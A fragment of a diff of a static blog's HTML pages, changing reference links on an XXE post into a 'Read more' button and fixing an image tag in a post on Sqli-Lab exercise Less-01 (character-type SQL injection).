-<p>[4] <a href="https://xz.aliyun.com/t/122#toc-6" target="_blank" rel="noopener">黑夜的猎杀-盲打XXE</a></p>
-<p>[5] <a href="https://blog.zsec.uk/blind-xxe-learning/" target="_blank" rel="noopener">HUNTING IN THE DARK - BLIND XXE</a></p>
-<p>[6] <a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">XXE漏洞利用技巧：从XML到远程代码执行</a></p>
-
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/05/09/XXE/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1175,7 +963,7 @@
       
         
           <h2 id="Less-01"><a href="#Less-01" class="headerlink" title="Less-01"></a>Less-01</h2><p>字符型<code>&#39;</code><br>联合查询Or报错注入</p>
-<p>联合查询&lt;%asset_img Sqli-Lab/Less-01-01.png%&gt;</p>
+<p>联合查询<img src="/2019/05/03/Sqli-Lab/Less-01-01.png"></p>
           <!--noindex-->
           
             <div class="post-button text-center">
